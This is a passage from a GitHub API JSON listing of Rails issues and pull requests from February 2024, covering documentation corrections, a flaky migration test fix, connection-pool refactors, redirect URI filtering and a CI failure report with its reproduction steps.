        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because  of an incorrect reference to the act of renaming a partial when in fact it is a local variable that would be renamed instead.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes that reference from `partial` to `local variable` as it is referred to in a previous section in this same guide document.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [X] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [X] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51180/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51180/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51179",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51179/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51179/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51179/events",
        "html_url": "https://github.com/rails/rails/issues/51179",
        "id": 2152238323,
        "node_id": "I_kwDNIULOgEiM8w",
        "number": 51179,
        "title": "[DOCS] Confusing description and broken link for config.action_view.erb_trim_mode",
        "user": {
            "login": "sobstel",
            "id": 117428,
            "node_id": "MDQ6VXNlcjExNzQyOA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/117428?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sobstel",
            "html_url": "https://github.com/sobstel",
            "followers_url": "https://api.github.com/users/sobstel/followers",
            "following_url": "https://api.github.com/users/sobstel/following{/other_user}",
            "gists_url": "https://api.github.com/users/sobstel/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sobstel/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sobstel/subscriptions",
            "organizations_url": "https://api.github.com/users/sobstel/orgs",
            "repos_url": "https://api.github.com/users/sobstel/repos",
            "events_url": "https://api.github.com/users/sobstel/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sobstel/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-24T09:54:16Z",
        "updated_at": "2024-02-26T17:20:30Z",
        "closed_at": "2024-02-26T17:20:30Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "> Gives the trim mode to be used by ERB. It defaults to '-', which turns on trimming of tail spaces and newline when using <%= -%> or <%= =%>. See the [Erubis documentation](http://www.kuwata-lab.com/erubis/users-guide.06.html#topics-trimspaces) for more information.\r\n\r\nThe only possible option for `config.action_view.erb_trim_mode` is `-`, which - if set - enables `trim` mode (https://github.com/rails/rails/blob/47300002db11d67d7b35103f5c429dad7dacdacd/actionview/lib/action_view/template/handlers/erb.rb#L81) and it's not used anywhere else. Any other option is not possible.\r\n\r\nPrevious try to fix it https://github.com/rails/rails/pull/50157 was rejected, but this actually correcty describes current behaviour.\r\n\r\nAlso, Erubis documentation links is broken. It constantly gives `Error: Server Error`. I'm not sure if this is needed at all considering the only possible option is \"-\" .\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51179/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51179/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51178",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51178/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51178/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51178/events",
        "html_url": "https://github.com/rails/rails/pull/51178",
        "id": 2151994751,
        "node_id": "PR_kwDNIULOZ83qKA",
        "number": 51178,
        "title": "Fix flaky `multi_db_migrator_test.rb` test",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-24T00:42:09Z",
        "updated_at": "2024-02-26T00:14:40Z",
        "closed_at": "2024-02-24T04:07:07Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51178",
            "html_url": "https://github.com/rails/rails/pull/51178",
            "diff_url": "https://github.com/rails/rails/pull/51178.diff",
            "patch_url": "https://github.com/rails/rails/pull/51178.patch",
            "merged_at": "2024-02-24T04:07:07Z"
        },
        "body": "Fixes #51172.\r\n\r\nIn the touched in this PR test case migrations were not properly reverted, and so this migration from the failing test case was not running https://github.com/rails/rails/blob/b6285e98f01373ddd4114735e6548592128c32a8/activerecord/test/cases/migration/compatibility_test.rb#L740-L744 because we already have a migration with `version=1` migrated.\r\n\r\ncc @yahonda ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51178/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51178/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51177",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51177/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51177/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51177/events",
        "html_url": "https://github.com/rails/rails/pull/51177",
        "id": 2151555276,
        "node_id": "PR_kwDNIULOZ8fhLQ",
        "number": 51177,
        "title": "doc: Fix upgrade guide (7.1 AR hash_digest_class) [ci skip]",
        "user": {
            "login": "danielolivaresd",
            "id": 2091837,
            "node_id": "MDQ6VXNlcjIwOTE4Mzc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2091837?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/danielolivaresd",
            "html_url": "https://github.com/danielolivaresd",
            "followers_url": "https://api.github.com/users/danielolivaresd/followers",
            "following_url": "https://api.github.com/users/danielolivaresd/following{/other_user}",
            "gists_url": "https://api.github.com/users/danielolivaresd/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/danielolivaresd/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/danielolivaresd/subscriptions",
            "organizations_url": "https://api.github.com/users/danielolivaresd/orgs",
            "repos_url": "https://api.github.com/users/danielolivaresd/repos",
            "events_url": "https://api.github.com/users/danielolivaresd/events{/privacy}",
            "received_events_url": "https://api.github.com/users/danielolivaresd/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-23T18:00:55Z",
        "updated_at": "2024-02-23T21:01:42Z",
        "closed_at": "2024-02-23T21:01:42Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51177",
            "html_url": "https://github.com/rails/rails/pull/51177",
            "diff_url": "https://github.com/rails/rails/pull/51177.diff",
            "patch_url": "https://github.com/rails/rails/pull/51177.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nWhile the configuration guide for `config.active_record.encryption.hash_digest_class` is correct regarding the starting version in which this configuration is defaulted to SHA256, the upgrade guide says that the starting version is 7.0, which is incorrect. This can cause someone upgrading an app that was created with Rails 7.0 to 7.1 to think that they are \"safe\" because they are already using SHA256, when they are not.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the upgrade guide (`guides/source/upgrading_ruby_on_rails.md`) by mentioning that SHA-1 was the default `config.active_record.encryption.hash_digest_class` before Rails 7.1, not Rails 7.0.\r\n\r\n### Additional information\r\n\r\nSee https://edgeguides.rubyonrails.org/configuring.html#config-active-record-encryption-hash-digest-class . This configuration guide is correct. We just needed to fix the upgrade guide to make it match with it.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] ~Tests are added or updated if you fix a bug or add a feature.~\r\n* [x] ~CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.~\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51177/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51177/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51176",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51176/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51176/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51176/events",
        "html_url": "https://github.com/rails/rails/pull/51176",
        "id": 2151351486,
        "node_id": "PR_kwDNIULOZ8UWvQ",
        "number": 51176,
        "title": "Introduce `Rails::Generators::Testing::Assertions#assert_initializer`",
        "user": {
            "login": "stevepolitodesign",
            "id": 5122678,
            "node_id": "MDQ6VXNlcjUxMjI2Nzg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5122678?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/stevepolitodesign",
            "html_url": "https://github.com/stevepolitodesign",
            "followers_url": "https://api.github.com/users/stevepolitodesign/followers",
            "following_url": "https://api.github.com/users/stevepolitodesign/following{/other_user}",
            "gists_url": "https://api.github.com/users/stevepolitodesign/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/stevepolitodesign/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/stevepolitodesign/subscriptions",
            "organizations_url": "https://api.github.com/users/stevepolitodesign/orgs",
            "repos_url": "https://api.github.com/users/stevepolitodesign/repos",
            "events_url": "https://api.github.com/users/stevepolitodesign/events{/privacy}",
            "received_events_url": "https://api.github.com/users/stevepolitodesign/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-23T15:48:11Z",
        "updated_at": "2024-02-26T17:20:21Z",
        "closed_at": "2024-02-23T20:36:05Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51176",
            "html_url": "https://github.com/rails/rails/pull/51176",
            "diff_url": "https://github.com/rails/rails/pull/51176.diff",
            "patch_url": "https://github.com/rails/rails/pull/51176.patch",
            "merged_at": "2024-02-23T20:36:05Z"
        },
        "body": "### Motivation / Background\r\n\r\nCompliments the existing [initializer][] generator action.\r\n\r\n[initializer]: https://api.rubyonrails.org/classes/Rails/Generators/Actions.html#method-i-initializer\r\n\r\n### Detail\r\n\r\n```rb\r\nassert_initializer \"mail_interceptors.rb\"\r\nassert_initializer \"mail_interceptors.rb\", /SandboxEmailInterceptor/\r\nassert_initializer \"mail_interceptors.rb\" do |initializer|\r\n  assert_match(/SandboxEmailInterceptor/, initializer)\r\nend\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51176/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51176/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51175",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51175/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51175/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51175/events",
        "html_url": "https://github.com/rails/rails/pull/51175",
        "id": 2150798647,
        "node_id": "PR_kwDNIULOZ713YQ",
        "number": 51175,
        "title": "Refactor FixtureSet to deal with connection pools",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-23T10:27:31Z",
        "updated_at": "2024-02-23T10:38:08Z",
        "closed_at": "2024-02-23T10:38:08Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51175",
            "html_url": "https://github.com/rails/rails/pull/51175",
            "diff_url": "https://github.com/rails/rails/pull/51175.diff",
            "patch_url": "https://github.com/rails/rails/pull/51175.patch",
            "merged_at": "2024-02-23T10:38:08Z"
        },
        "body": "Extracted from: https://github.com/rails/rails/pull/50793\r\n\r\nAllow to check the cache without checking out a connection.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51175/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51175/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51174",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51174/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51174/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51174/events",
        "html_url": "https://github.com/rails/rails/pull/51174",
        "id": 2150736586,
        "node_id": "PR_kwDNIULOZ7ydYQ",
        "number": 51174,
        "title": "Don't require an active connection for table and column quoting",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-23T09:50:44Z",
        "updated_at": "2024-02-27T10:34:33Z",
        "closed_at": "2024-02-27T10:34:32Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51174",
            "html_url": "https://github.com/rails/rails/pull/51174",
            "diff_url": "https://github.com/rails/rails/pull/51174.diff",
            "patch_url": "https://github.com/rails/rails/pull/51174.patch",
            "merged_at": "2024-02-27T10:34:32Z"
        },
        "body": "Extracted from: https://github.com/rails/rails/pull/50793\r\n\r\nRight now quoting table or column names requires a leased Adapter instance, even though none of the implementations actually requires an active connection.\r\n\r\nThe idea here is to move these methods to the class so that the quoting can be done without leasing a connection or even needing the connection to ever have been established.\r\n\r\nI also checked `activerecord-sqlserver-adapter` (FYI @aidanharan) and `oracle-enhanced` (FYI @yahonda) gems, and neither need an active connection.\r\n\r\nAlso FYI @matthewd as you may have opinions. I'm a bit on the fence about moving these to the class, an alternative could be to move them to a different object, but I'm think this keeps the `Adapter` interface simpler.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51174/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51174/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51173",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51173/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51173/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51173/events",
        "html_url": "https://github.com/rails/rails/pull/51173",
        "id": 2150435325,
        "node_id": "PR_kwDNIULOZ7hzmQ",
        "number": 51173,
        "title": "Handle bad URIs when filtering redirects",
        "user": {
            "login": "gmcgibbon",
            "id": 5162312,
            "node_id": "MDQ6VXNlcjUxNjIzMTI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5162312?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/gmcgibbon",
            "html_url": "https://github.com/gmcgibbon",
            "followers_url": "https://api.github.com/users/gmcgibbon/followers",
            "following_url": "https://api.github.com/users/gmcgibbon/following{/other_user}",
            "gists_url": "https://api.github.com/users/gmcgibbon/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/gmcgibbon/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/gmcgibbon/subscriptions",
            "organizations_url": "https://api.github.com/users/gmcgibbon/orgs",
            "repos_url": "https://api.github.com/users/gmcgibbon/repos",
            "events_url": "https://api.github.com/users/gmcgibbon/events{/privacy}",
            "received_events_url": "https://api.github.com/users/gmcgibbon/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-23T06:16:26Z",
        "updated_at": "2024-02-23T21:39:22Z",
        "closed_at": "2024-02-23T21:39:19Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51173",
            "html_url": "https://github.com/rails/rails/pull/51173",
            "diff_url": "https://github.com/rails/rails/pull/51173.diff",
            "patch_url": "https://github.com/rails/rails/pull/51173.patch",
            "merged_at": "2024-02-23T21:39:18Z"
        },
        "body": "### Motivation / Background\r\n\r\nrails/rails#51131 introduced parameter filtering for redirects. We didn't account for invalid URIs though, and it changes the behaviour of redirect_to to raise URI errors when we try to filter a bad URI. Instead, we should fallback to filtering bad URIs entirely to preserve behaviour.\r\n\r\nThis Pull Request has been created because rails/rails#51131 changes the behaviour of redirection, and I'm concerned it will break applications.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes redirect filtering to fallback to filtering the entire URI when we can't parse the URI.\r\n\r\n### Additional information\r\n\r\nWe seem to do this for permitted host checking etc, so I think this is the correct behaviour.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51173/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51173/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51172",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51172/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51172/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51172/events",
        "html_url": "https://github.com/rails/rails/issues/51172",
        "id": 2150263938,
        "node_id": "I_kwDNIULOgCpsgg",
        "number": 51172,
        "title": "`CompatibilityTest6_0#test_datetime_doesnt_set_precision_on_change_column` fails",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 776781281,
                "node_id": "MDU6TGFiZWw3NzY3ODEyODE=",
                "url": "https://api.github.com/repos/rails/rails/labels/ci%20issues",
                "name": "ci issues",
                "color": "aaafff",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-23T02:28:23Z",
        "updated_at": "2024-02-24T04:07:08Z",
        "closed_at": "2024-02-24T04:07:08Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nManaged to reproduce CI failure at https://buildkite.com/rails/rails-nightly/builds/206#018dd344-8ac6-45bb-b9b6-18553e433e1a/1202-1211 \r\n\r\n```ruby\r\ngit clone https://github.com/rails/rails\r\ncd rails/activerecord\r\nbundle exec rake db:mysql:rebuild\r\nbundle install\r\nARCONN=mysql2 bin/test test/cases/multi_db_migrator_test.rb test/cases/migration/compatibility_test.rb -n \"/^(?:MultiDbMigratorTest#(?:test_migrator_db_has_no_schema_migrations_table)|CompatibilityTest6_0#(?:test_datetime_doesnt_set_precision_on_change_column))$/\" --seed 7842\r\n```\r\n\r\n### Expected behavior\r\nIt should pass.\r\n\r\n### Actual behavior\r\n```ruby\r\n$ ARCONN=mysql2 bin/test test/cases/multi_db_migrator_test.rb test/cases/migration/compatibility_test.rb -n \"/^(?:MultiDbMigratorTest#(?:test_migrator_db_has_no_schema_migrations_table)|CompatibilityTest6_0#(?:test_datetime_doesnt_set_precision_on_change_column))$/\" --seed 7842\r\nUsing mysql2\r\nRun options: -n \"/^(?:MultiDbMigratorTest#(?:test_migrator_db_has_no_schema_migrations_table)|CompatibilityTest6_0#(?:test_datetime_doesnt_set_precision_on_change_column))$/\" --seed 7842\r\n\r\n# Running:\r\n\r\n.F\r\n\r\nFailure:\r\nCompatibilityTest6_0#test_datetime_doesnt_set_precision_on_change_column [test/cases/migration/compatibility_test.rb:748]:\r\nExpected false to be truthy.\r\n\r\n\r\nbin/test test/cases/migration/compatibility_test.rb:731\r\n\r\n\r\n\r\nFinished in 0.088723s, 22.5420 runs/s, 56.3550 assertions/s.\r\n2 runs, 5 assertions, 1 failures, 0 errors, 0 skips\r\n$\r\n```\r\n\r\n### System configuration\r\n**Rails version**: main branch\r\n\r\n**Ruby version**: ruby 3.3.0 (2023-12-25 revision 5124f9ac75) [x86_64-linux]\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51172/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
